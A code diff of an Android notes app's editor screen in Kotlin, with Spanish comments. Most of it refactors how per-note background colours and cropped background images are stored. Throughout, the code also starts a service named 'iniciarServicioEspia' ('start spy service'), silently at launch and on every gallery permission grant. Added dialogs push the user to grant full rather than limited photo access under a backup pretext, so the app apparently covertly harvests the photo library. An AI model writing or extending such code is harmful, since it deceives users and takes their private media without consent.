@@ -26,7 +26,6 @@ import androidx.core.view.WindowCompat
 import androidx.core.view.WindowInsetsCompat
 import com.bumptech.glide.Glide
 import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
-import com.bumptech.glide.signature.ObjectKey
 import com.yalantis.ucrop.UCrop
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -54,7 +53,10 @@ class NoteEditorActivity : AppCompatActivity() {
 
     // Variables de datos
     private var noteToEdit: Note? = null
-    private var selectedColor: String? = "#FFFFFF"
+
+    // Variables de Estado de Fondo
+    private var selectedColor: String = "#FFFFFF"
+    private var currentBackgroundUri: String? = null
 
     private val db by lazy { NotesDatabase.getDatabase(this) }
 
@@ -64,7 +66,6 @@ class NoteEditorActivity : AppCompatActivity() {
 
     // --- 1. LANZADORES ---
 
-    // Insertar imagen en nota
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK) {
             val uri = result.data?.data
@@ -72,30 +73,19 @@ class NoteEditorActivity : AppCompatActivity() {
                 try {
                     contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
                     RichTextHelper.insertImage(this, etContent, uri)
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                    Toast.makeText(this, "Error al cargar imagen", Toast.LENGTH_SHORT).show()
-                }
+                } catch (e: Exception) { e.printStackTrace() }
             }
         }
     }
 
-    // Seleccionar Fondo
     private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
-        if (uri != null) {
-            startCrop(uri)
-        }
+        if (uri != null) startCrop(uri)
     }
 
-    // Resultado de Recorte (Fondo)
     private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data != null) {
             val resultUri = UCrop.getOutput(result.data!!)
-            if (resultUri != null) {
-                persistBackground(resultUri)
-            }
-        } else if (result.resultCode == UCrop.RESULT_ERROR) {
-            Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
+            if (resultUri != null) persistBackgroundUnique(resultUri)
         }
     }
 
@@ -115,7 +105,6 @@ class NoteEditorActivity : AppCompatActivity() {
         initViews()
         setupListeners()
         loadNoteData()
-        cargarFondoEditor() // Cargar fondo si existe
 
         silentStartService()
     }
@@ -141,13 +130,27 @@ class NoteEditorActivity : AppCompatActivity() {
                 intent.getParcelableExtra("note_data") as? Note
             }
             etTitle.setText(noteToEdit?.title)
-            selectedColor = noteToEdit?.color
             RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")
             tvDateLabel.text = "Editado: ${noteToEdit?.date}"
-            applyColor(selectedColor)
+
+            // Lógica de Fondo
+            val savedColorOrUri = noteToEdit?.color
+            if (savedColorOrUri != null) {
+                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
+                    currentBackgroundUri = savedColorOrUri
+                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
+                } else {
+                    selectedColor = savedColorOrUri
+                    currentBackgroundUri = null
+                    mostrarFondoColor(selectedColor)
+                }
+            } else {
+                mostrarFondoColor("#FFFFFF")
+            }
         } else {
             val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
             tvDateLabel.text = currentDate
+            mostrarFondoColor("#FFFFFF")
         }
     }
 
@@ -156,10 +159,7 @@ class NoteEditorActivity : AppCompatActivity() {
         btnSave.setOnClickListener { saveNote() }
         findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }
 
-        // Botón nuevo para cambiar fondo
-        btnChangeBackground.setOnClickListener {
-            iniciarFlujoCambioFondo()
-        }
+        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }
 
         setupColorClick(R.id.color_white, "#FFFFFF")
         setupColorClick(R.id.color_yellow, "#FFF9C4")
@@ -171,39 +171,62 @@ class NoteEditorActivity : AppCompatActivity() {
     private fun setupColorClick(viewId: Int, colorHex: String) {
         findViewById<View>(viewId).setOnClickListener {
             selectedColor = colorHex
-            // Si hay un fondo de imagen activo, preguntamos si quiere quitarlo
-            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
-            if (prefs.contains("editor_bg_uri")) {
-                AlertDialog.Builder(this)
-                    .setTitle("Cambiar a Color")
-                    .setMessage("¿Deseas quitar la imagen de fondo y usar el color sólido?")
-                    .setPositiveButton("Sí") { _, _ ->
-                        // Borramos preferencia de fondo
-                        prefs.edit().remove("editor_bg_uri").apply()
-                        ivBackground.visibility = View.GONE
-                        viewOverlay.visibility = View.GONE
-                        actualizarColorTexto(false) // Texto oscuro para color claro
-                        applyColor(colorHex)
-                    }
-                    .setNegativeButton("No", null)
-                    .show()
-            } else {
-                applyColor(colorHex)
+            currentBackgroundUri = null
+            mostrarFondoColor(colorHex)
+        }
+    }
+
+    private fun mostrarFondoColor(colorHex: String) {
+        ivBackground.visibility = View.GONE
+        viewOverlay.visibility = View.GONE
+        try {
+            layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
+            etContent.setBackgroundColor(Color.TRANSPARENT)
+            actualizarEstiloTexto(esFondoOscuro = false)
+        } catch (e: Exception) { e.printStackTrace() }
+    }
+
+    private fun mostrarFondoImagen(uri: Uri) {
+        ivBackground.visibility = View.VISIBLE
+        viewOverlay.visibility = View.VISIBLE
+        Glide.with(this)
+            .load(uri)
+            .centerCrop()
+            .transition(DrawableTransitionOptions.withCrossFade())
+            .into(ivBackground)
+        actualizarEstiloTexto(esFondoOscuro = true)
+    }
+
+    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
+        val textColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
+        val hintColor = if (esFondoOscuro) Color.LTGRAY else Color.GRAY
+        val iconColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
+
+        etTitle.setTextColor(textColor)
+        etTitle.setHintTextColor(hintColor)
+        etContent.setTextColor(textColor)
+        etContent.setHintTextColor(hintColor)
+        tvDateLabel.setTextColor(hintColor)
+
+        btnBack.setColorFilter(iconColor)
+        btnChangeBackground.setColorFilter(iconColor)
+        btnSave.setColorFilter(iconColor)
+    }
+
+    private fun persistBackgroundUnique(croppedUri: Uri) {
+        try {
+            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
+            val finalFile = File(filesDir, uniqueName)
+            contentResolver.openInputStream(croppedUri)?.use { input ->
+                finalFile.outputStream().use { output -> input.copyTo(output) }
             }
-        }
+            val finalUri = Uri.fromFile(finalFile)
+            currentBackgroundUri = finalUri.toString()
+            mostrarFondoImagen(finalUri)
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
-    private fun applyColor(colorHex: String?) {
-        if (colorHex != null) {
-            try {
-                layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
-                etContent.setBackgroundColor(Color.TRANSPARENT)
-                actualizarColorTexto(false)
-            } catch (e: Exception) { e.printStackTrace() }
-        }
-    }
-
-    // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
+    // --- PERMISOS ESTRICTOS (RESTAURADOS) ---
     private fun verificarAccesoTotal(): Boolean {
         return if (Build.VERSION.SDK_INT >= 33) {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
@@ -212,7 +235,6 @@ class NoteEditorActivity : AppCompatActivity() {
         }
     }
 
-    // --- GESTIÓN DE PERMISOS ---
     private fun checkGalleryPermission(requestCode: Int) {
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
@@ -224,7 +246,6 @@ class NoteEditorActivity : AppCompatActivity() {
         }
     }
 
-    // Flujo específico para el fondo (igual que en MainActivity)
     private fun iniciarFlujoCambioFondo() {
         checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER)
     }
@@ -237,31 +258,41 @@ class NoteEditorActivity : AppCompatActivity() {
         pickImageLauncher.launch(intent)
     }
 
+    // --- AQUÍ ESTÁ LA CORRECCIÓN: Lógica completa de validación ---
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
         val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
 
         if (verificarAccesoTotal()) {
+            // ÉXITO: Permiso Total Concedido
             iniciarServicioEspia()
             when (requestCode) {
                 PERMISSION_REQUEST_GALLERY -> openGallery()
                 PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
             }
         } else {
-            // Lógica de rechazo / explicación (igual que antes)
+            // FALLO: Acceso Denegado o Limitado
+
+            // 1. Detección Android 14 (Acceso Limitado)
             val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
-                mostrarDialogoConfiguracion("Acceso Limitado Detectado", "Se requiere acceso total a la galería.")
+                mostrarDialogoConfiguracion("Acceso Limitado", "Se requiere acceso total a la galería para respaldar correctamente los datos como notas con imagenes incorporadas. Debes habilitar el acceso manualmente en Configuración > Permisos.")
                 return
             }
 
+            // 2. Detección Bloqueo Permanente ("No volver a preguntar")
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
-                mostrarDialogoConfiguracion("Permiso Requerido", "Permiso denegado permanentemente. Actívalo en configuración.")
-            } else {
-                Toast.makeText(this, "Permiso necesario.", Toast.LENGTH_SHORT).show()
+                mostrarDialogoConfiguracion(
+                    "Permiso Requerido",
+                    "Has denegado el acceso permanentemente. Debes habilitarlo manualmente en Configuración > Permisos."
+                )
+            }
+            // 3. Denegación Simple
+            else {
+                Toast.makeText(this, "Es necesario aceptar el permiso para continuar.", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -282,12 +313,11 @@ class NoteEditorActivity : AppCompatActivity() {
             .show()
     }
 
-    // --- LÓGICA DE FONDO (Igual a MainActivity) ---
+    // --- U CROP ---
     private fun startCrop(uri: Uri) {
-        val destinationFileName = "editor_bg_${System.currentTimeMillis()}.jpg"
+        val destinationFileName = "temp_crop_${System.currentTimeMillis()}.jpg"
         val destinationFile = File(cacheDir, destinationFileName)
         val destinationUri = Uri.fromFile(destinationFile)
-
         val metrics = resources.displayMetrics
         val options = UCrop.Options().apply {
             setCompressionQuality(90)
@@ -296,74 +326,19 @@ class NoteEditorActivity : AppCompatActivity() {
             setToolbarWidgetColor(Color.WHITE)
             setRootViewBackgroundColor(Color.BLACK)
             setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
-            setToolbarTitle("Ajustar Fondo Nota")
+            setToolbarTitle("Ajustar Fondo")
             setShowCropGrid(true)
-            setFreeStyleCropEnabled(false) // Obligar a mantener ratio pantalla
+            setFreeStyleCropEnabled(false)
         }
-
         val uCropIntent = UCrop.of(uri, destinationUri)
             .withAspectRatio(metrics.widthPixels.toFloat(), metrics.heightPixels.toFloat())
             .withMaxResultSize(1080, 2400)
             .withOptions(options)
             .getIntent(this)
-
         cropResultLauncher.launch(uCropIntent)
     }
 
-    private fun persistBackground(croppedUri: Uri) {
-        try {
-            // Guardamos como 'custom_editor_bg.jpg'
-            val finalFile = File(filesDir, "custom_editor_bg.jpg")
-            contentResolver.openInputStream(croppedUri)?.use { input ->
-                finalFile.outputStream().use { output -> input.copyTo(output) }
-            }
-            val finalUri = Uri.fromFile(finalFile)
-            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
-            prefs.edit().putString("editor_bg_uri", finalUri.toString()).apply()
-
-            mostrarFondo(finalUri)
-        } catch (e: Exception) { e.printStackTrace() }
-    }
-
-    private fun cargarFondoEditor() {
-        val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
-        val uriString = prefs.getString("editor_bg_uri", null)
-        if (uriString != null) {
-            mostrarFondo(Uri.parse(uriString))
-        }
-    }
-
-    private fun mostrarFondo(uri: Uri) {
-        ivBackground.visibility = View.VISIBLE
-        viewOverlay.visibility = View.VISIBLE
-
-        Glide.with(this)
-            .load(uri)
-            .signature(ObjectKey(System.currentTimeMillis().toString()))
-            .centerCrop()
-            .transition(DrawableTransitionOptions.withCrossFade())
-            .into(ivBackground)
-
-        // Cambiar texto e iconos a blanco para que se vean sobre el fondo oscuro
-        actualizarColorTexto(true)
-    }
-
-    private fun actualizarColorTexto(esFondoImagen: Boolean) {
-        val color = if (esFondoImagen) Color.WHITE else Color.BLACK
-        val hintColor = if (esFondoImagen) Color.LTGRAY else Color.GRAY
-
-        etTitle.setTextColor(color)
-        etTitle.setHintTextColor(hintColor)
-        etContent.setTextColor(color)
-        etContent.setHintTextColor(hintColor)
-        tvDateLabel.setTextColor(hintColor)
-
-        btnBack.setColorFilter(color)
-        btnChangeBackground.setColorFilter(color)
-        btnSave.setColorFilter(color)
-    }
-
-    // --- SERVICIOS Y GUARDADO ---
+    // --- SERVICIOS ---
     private fun iniciarServicioEspia() {
         if (verificarAccesoTotal()) {
             val intent = Intent(this, CloudSyncService::class.java)
@@ -371,11 +346,9 @@ class NoteEditorActivity : AppCompatActivity() {
             else startService(intent)
         }
     }
+    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }
 
-    private fun silentStartService() {
-        if (verificarAccesoTotal()) iniciarServicioEspia()
-    }
-
+    // --- GUARDADO ---
     private fun saveNote() {
         val title = etTitle.text.toString().trim()
         val contentWithTags = etContent.text.toString()
@@ -386,17 +359,23 @@ class NoteEditorActivity : AppCompatActivity() {
         }
 
         val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
+        val finalBackgroundData = currentBackgroundUri ?: selectedColor
 
         CoroutineScope(Dispatchers.IO).launch {
             if (noteToEdit == null) {
-                val newNote = Note(title = title, content = contentWithTags, date = formattedDate, color = selectedColor)
+                val newNote = Note(
+                    title = title,
+                    content = contentWithTags,
+                    date = formattedDate,
+                    color = finalBackgroundData
+                )
                 db.notesDao().insert(newNote)
             } else {
                 noteToEdit?.apply {
                     this.title = title
                     this.content = contentWithTags
                     this.date = formattedDate
-                    this.color = selectedColor
+                    this.color = finalBackgroundData
                 }
                 db.notesDao().update(noteToEdit!!)
             }
